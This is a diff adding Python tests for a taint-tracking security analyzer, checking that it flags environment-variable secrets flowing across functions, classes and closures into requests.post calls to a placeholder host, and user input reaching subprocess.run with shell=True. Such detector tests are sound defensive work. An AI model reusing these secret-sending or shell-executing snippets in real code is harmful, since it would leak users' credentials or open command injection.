@@ -18,6 +18,7 @@
 from __future__ import annotations
 
 import json
+import textwrap
 import time
 
 from skillspector.nodes.analyzers import behavioral_taint_tracking
@@ -949,3 +950,511 @@ class TestFixpointTermination:
         assert len(sources) == 2 * width
         assert all(src == "os.getenv" for src in sources.values())
         assert elapsed < 1.0
+
+
+# ── Function scopes and interprocedural flows ─────────────────────────
+
+
+def _code(text: str) -> str:
+    """Dedent a test module; line 1 is the first line after the opening quotes."""
+    return textwrap.dedent(text).lstrip("\n")
+
+
+def _line(code: str, marker: str) -> int:
+    """1-based line number of the only line containing *marker*."""
+    (number,) = [i for i, line in enumerate(code.splitlines(), 1) if marker in line]
+    return number
+
+
+def _flows(code: str, rule: str = "TT3") -> list:
+    return [f for f in _run(code) if f.rule_id == rule]
+
+
+class TestFunctionScopePrecision:
+    """A tainted name in one function must not taint a same-named name elsewhere.
+
+    Taint used to be keyed by bare variable name across the whole file. Once
+    propagation became order-independent (#611), a tainted local such as
+    ``headers`` in one function tainted every unrelated variable or parameter
+    called ``headers`` in the file, reporting TT3 (CRITICAL) on sinks that never
+    see the credential.
+    """
+
+    def test_parameter_named_like_a_tainted_local_is_not_tainted(self) -> None:
+        helper = _code(
+            """
+            def fetch(url, headers):
+                return requests.get(url, headers=headers)
+            """
+        )
+        caller = _code(
+            """
+            def main():
+                headers = {"Authorization": os.getenv("API_TOKEN")}
+                print(headers)
+                fetch("https://example.invalid/v1", {"Accept": "application/json"})
+            """
+        )
+        # Definition order must not matter either way.
+        for body in (helper + caller, caller + helper):
+            assert _flows("import os, requests\n" + body) == []
+
+    def test_same_local_name_in_two_functions_is_not_shared(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def read_token():
+                token = os.getenv("API_TOKEN")
+                return len(token)
+            def send_public():
+                token = "public"
+                requests.post("https://example.invalid", data=token)
+            """
+        )
+        assert _flows(code) == []
+
+    def test_method_parameter_named_like_a_tainted_local_is_not_tainted(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Client:
+                def check(self):
+                    token = os.getenv("API_TOKEN")
+                    return bool(token)
+                def send(self, token):
+                    requests.post("https://example.invalid", data=token)
+            Client().send("public")
+            """
+        )
+        assert _flows(code) == []
+
+    def test_local_shadowing_a_tainted_global_is_not_tainted(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            TOKEN = os.getenv("API_TOKEN")
+            def send():
+                TOKEN = "public"
+                requests.post("https://example.invalid", data=TOKEN)
+            """
+        )
+        assert _flows(code) == []
+
+    def test_only_the_parameter_receiving_the_secret_is_tainted(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def upload(url, payload):
+                requests.get(url)  # CLEAN
+                requests.post(url, data=payload)  # SINK
+            def main():
+                upload("https://example.invalid", os.getenv("API_TOKEN"))
+            """
+        )
+        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]
+
+    def test_instance_attributes_are_per_class(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Secret:
+                def __init__(self):
+                    self.token = os.getenv("API_TOKEN")
+            class Public:
+                def __init__(self):
+                    self.token = "public"
+                def send(self):
+                    requests.post("https://example.invalid", data=self.token)
+            """
+        )
+        assert _flows(code) == []
+
+
+class TestInterproceduralFlows:
+    """Scoping must not lose flows that cross function boundaries."""
+
+    def test_helper_return_assigned_to_the_same_name(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def get_key():
+                key = os.getenv("API_KEY")
+                return key
+            def send():
+                key = get_key()
+                requests.post("https://example.invalid", data=key)  # SINK
+            """
+        )
+        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]
+
+    def test_helper_return_assigned_to_another_name(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def get_key():
+                return os.getenv("API_KEY")
+            def send():
+                value = get_key()
+                requests.post("https://example.invalid", data=value)  # SINK
+            """
+        )
+        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]
+
+    def test_helper_called_inside_the_sink_arguments(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def get_key():
+                return os.environ["API_KEY"]
+            requests.post("https://example.invalid", data=get_key())
+            """
+        )
+        (finding,) = _flows(code)
+        assert "'get_key()'" in finding.message
+
+    def test_chained_helper_returns(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def raw():
+                return os.getenv("API_KEY")
+            def normalized():
+                return raw().strip()
+            requests.post("https://example.invalid", data=normalized())
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_secret_bound_to_a_parameter(self) -> None:
+        for call in (
+            "upload(secret)",
+            "upload(payload=secret)",
+            "upload(*[secret])",
+            "upload(**{'payload': secret})",
+            'upload(os.getenv("API_KEY"))',
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                def upload(payload):
+                    requests.post("https://example.invalid", data=payload)
+                def main():
+                    secret = os.getenv("API_KEY")
+                    {call}
+                """
+            )
+            assert len(_flows(code)) == 1, call
+
+    def test_varargs_kwargs_and_defaults_receive_secrets(self) -> None:
+        for definition, call in (
+            ("def send(*value):", 'send("x", os.getenv("API_KEY"))'),
+            ("def send(**value):", 'send(key=os.getenv("API_KEY"))'),
+            ('def send(value=os.getenv("API_KEY")):', "send()"),
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                {definition}
+                    requests.post("https://example.invalid", data=value)
+                {call}
+                """
+            )
+            assert len(_flows(code)) == 1, definition
+
+    def test_function_passed_as_a_callback_receives_following_arguments(self) -> None:
+        for call in (
+            "threading.Thread(target=upload, args=(secret,)).start()",
+            "executor.submit(upload, secret)",
+        ):
+            code = _code(
+                f"""
+                import os, requests, threading
+                def upload(body):
+                    requests.post("https://example.invalid", data=body)
+                def main(executor):
+                    secret = os.getenv("API_KEY")
+                    {call}
+                """
+            )
+            assert len(_flows(code)) == 1, call
+
+    def test_global_assigned_inside_a_function(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def configure():
+                global TOKEN
+                TOKEN = os.getenv("API_TOKEN")
+            def send():
+                requests.post("https://example.invalid", data=TOKEN)
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_closures_and_nested_functions(self) -> None:
+        """Nested functions see enclosing locals and bind arguments lexically."""
+        free_variable = _code(
+            """
+            import os, requests
+            def outer():
+                token = os.getenv("API_TOKEN")
+                def inner():
+                    requests.post("https://example.invalid", data=token)
+                inner()
+            """
+        )
+        bound_argument = _code(
+            """
+            import os, requests
+            def outer():
+                token = os.getenv("API_TOKEN")
+                def inner(value):
+                    requests.post("https://example.invalid", data=value)
+                inner(token)
+            """
+        )
+        nonlocal_rebinding = _code(
+            """
+            import os, requests
+            def outer():
+                token = None
+                def load():
+                    nonlocal token
+                    token = os.getenv("API_TOKEN")
+                load()
+                requests.post("https://example.invalid", data=token)
+            """
+        )
+        for code in (free_variable, bound_argument, nonlocal_rebinding):
+            assert len(_flows(code)) == 1, code
+
+    def test_instance_attribute_set_in_init(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Client:
+                def __init__(self):
+                    self.token = os.getenv("API_TOKEN")
+                def send(self):
+                    token = self.token
+                    requests.post("https://example.invalid", data=token)
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_constructor_argument_stored_on_self(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Client:
+                def __init__(self, token):
+                    self.token = token
+                def send(self):
+                    requests.post("https://example.invalid", headers={"A": self.token})
+            Client(os.getenv("API_TOKEN")).send()
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_class_attribute_read_through_self(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Client:
+                TOKEN = os.getenv("API_TOKEN")
+                def send(self):
+                    requests.post("https://example.invalid", headers={"A": self.TOKEN})
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_attribute_set_in_base_class_read_in_subclass(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Base:
+                def __init__(self):
+                    self.token = os.getenv("API_TOKEN")
+            class Child(Base):
+                def send(self):
+                    requests.post("https://example.invalid", data=self.token)
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_method_calls_bind_arguments(self) -> None:
+        on_instance = _code(
+            """
+            import os, requests
+            class Api:
+                def upload(self, body):
+                    requests.post("https://example.invalid", data=body)
+            def main():
+                api = Api()
+                api.upload(os.getenv("API_TOKEN"))
+            """
+        )
+        on_self = _code(
+            """
+            import os, requests
+            class Api:
+                def _send(self, body):
+                    requests.post("https://example.invalid", data=body)
+                def run(self):
+                    self._send(os.getenv("API_TOKEN"))
+            """
+        )
+        static = _code(
+            """
+            import os, requests
+            class Api:
+                @staticmethod
+                def send(body):
+                    requests.post("https://example.invalid", data=body)
+            Api.send(os.getenv("API_TOKEN"))
+            """
+        )
+        for code in (on_instance, on_self, static):
+            assert len(_flows(code)) == 1, code
+
+    def test_user_input_reaching_exec_through_a_helper(self) -> None:
+        code = _code(
+            """
+            import subprocess
+            def run(command):
+                subprocess.run(command, shell=True)
+            run(input())
+            """
+        )
+        assert len(_flows(code, "TT5")) == 1
+
+    def test_recursive_helpers_terminate(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def ping(value):
+                requests.post("https://example.invalid", data=value)
+                return pong(value)
+            def pong(value):
+                return ping(value)
+            ping(os.getenv("API_TOKEN"))
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_token_from_helper_header_builder_reaches_request(self) -> None:
+        """A token loaded by a helper, put in an auth header and sent, is TT3."""
+        code = _code(
+            """
+            import os, requests
+            def load_token():
+                token = os.getenv("SERVICE_TOKEN")  # SOURCE
+                return token.strip() if token else None
+            def auth_headers(token=None):
+                if token is None:
+                    token = load_token()
+                return {"Authorization": f"Bearer {token}"}
+            def service_get(url, *, headers=None):
+                request_headers = dict(headers or {})
+                return requests.get(url, headers=request_headers)  # SINK
+            def check(url):
+                return service_get(url, headers=auth_headers())
+            """
+        )
+        (finding,) = _flows(code)
+        assert finding.start_line == _line(code, "# SINK")
+        assert f"(line {_line(code, '# SOURCE')}," in finding.message
+
+
+class TestSourceLineAttribution:
+    """Messages cite the line of the source call, not of the last copy."""
+
+    def test_reassignment_chain_cites_the_source_line(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            secret = os.getenv("API_KEY")
+            first = secret
+            second = first
+            requests.post("https://example.invalid", data=second)
+            """
+        )
+        (finding,) = _flows(code)
+        assert "'second' from os.getenv (line 2," in finding.message
+
+    def test_multiline_assignment_cites_the_source_call_line(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            payload = {
+                "user": "example",
+                "key": os.getenv("API_KEY"),  # SOURCE
+            }
+            requests.post("https://example.invalid", json=payload)
+            """
+        )
+        (finding,) = _flows(code)
+        assert f"(line {_line(code, '# SOURCE')}," in finding.message
+
+    def test_cross_function_flow_cites_the_callers_source_line(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def upload(payload):
+                requests.post("https://example.invalid", data=payload)
+            def main():
+                secret = os.getenv("API_KEY")  # SOURCE
+                upload(secret)
+            """
+        )
+        (finding,) = _flows(code)
+        assert f"'payload' from os.getenv (line {_line(code, '# SOURCE')}," in finding.message
+
+
+class TestInterproceduralBounds:
+    """Call binding goes through per-callee argument slots, so it stays linear."""
+
+    def test_many_same_named_methods_and_call_sites_bind_linearly(self, monkeypatch) -> None:
+        """N methods named ``put`` and N ``obj.put(secret)`` calls: O(N), not O(N^2)."""
+        count = 400
+        classes = "\n".join(
+            f"class Store{i}:\n    def put(self, value):\n        return value"
+            for i in range(count)
+        )
+        calls = "\n".join(f"    store{i}.put(secret)" for i in range(count))
+        code = (
+            "import os\n"
+            f"{classes}\n"
+            "def main(" + ", ".join(f"store{i}" for i in range(count)) + "):\n"
+            '    secret = os.getenv("API_KEY")\n'
+            f"{calls}\n"
+        )
+        calls_made = {"n": 0}
+        original = behavioral_taint_tracking._mark_targets
+
+        def counting_mark_targets(*args, **kwargs):
+            calls_made["n"] += 1
+            return original(*args, **kwargs)
+
+        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)
+        start = time.monotonic()
+        sources = _collect(code, _capped_check_runtime(count * 200))
+        elapsed = time.monotonic() - start
+
+        # Every method's parameter is reached through the shared argument slot.
+        assert sum(1 for key in sources if key.endswith(".<locals>.value")) == count
+        # A per-pair binding would fire count * count edges.
+        assert calls_made["n"] <= 10 * count
+        assert elapsed < 2.0
+
+    def test_positional_arguments_beyond_the_slot_cap_still_bind(self) -> None:
+        width = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS + 4
+        params = ", ".join(f"p{i}" for i in range(width))
+        args = ", ".join('os.getenv("API_KEY")' if i == width - 1 else str(i) for i in range(width))
+        code = (
+            "import os, requests\n"
+            f"def send({params}):\n"
+            f'    requests.post("https://example.invalid", data=p{width - 1})\n'
+            f"send({args})\n"
+        )
+        assert len(_flows(code)) == 1
